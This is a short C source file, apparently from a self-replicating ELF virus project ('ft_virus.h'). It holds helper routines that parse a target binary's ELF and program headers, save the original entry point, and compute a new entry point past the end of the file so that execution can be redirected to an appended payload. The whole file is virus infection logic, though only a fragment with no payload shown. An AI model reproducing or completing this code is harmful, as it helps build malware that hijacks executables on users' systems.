#include "ft_virus.h"

u64 FORCE_INLINE get_virt_addr(int fd)
{
	size_t headers_length;
	Elf64_Ehdr e_hdr;
	Elf64_Phdr p_hdr;

	LSEEK(fd, 0, SEEK_SET);
	READ(fd, &e_hdr, sizeof(e_hdr));
	headers_length = e_hdr.e_phnum;
	LSEEK(fd, e_hdr.e_phoff, SEEK_SET);
	do {
		READ(fd, &p_hdr, sizeof(p_hdr));
		if (p_hdr.p_type == PT_LOAD)
			return p_hdr.p_vaddr;
		headers_length -= 1;
	} while ( headers_length );
	return (0);
}

t_binary get_infos(int fd)
{
	t_binary res;
	Elf64_Ehdr e_hdr;
	char signature[] = SIGNATURE;

	LSEEK(fd, 0, SEEK_SET);
	READ(fd, &e_hdr, sizeof(e_hdr));
	res.old_entry = e_hdr.e_entry;
	res.file_size = LSEEK(fd, 0, SEEK_END);
	res.v_addr = get_virt_addr(fd);
	res.new_pentry = res.file_size + sizeof(signature) - 1;
	res.new_entry = res.new_pentry + 0xc000000;
	return (res);
}
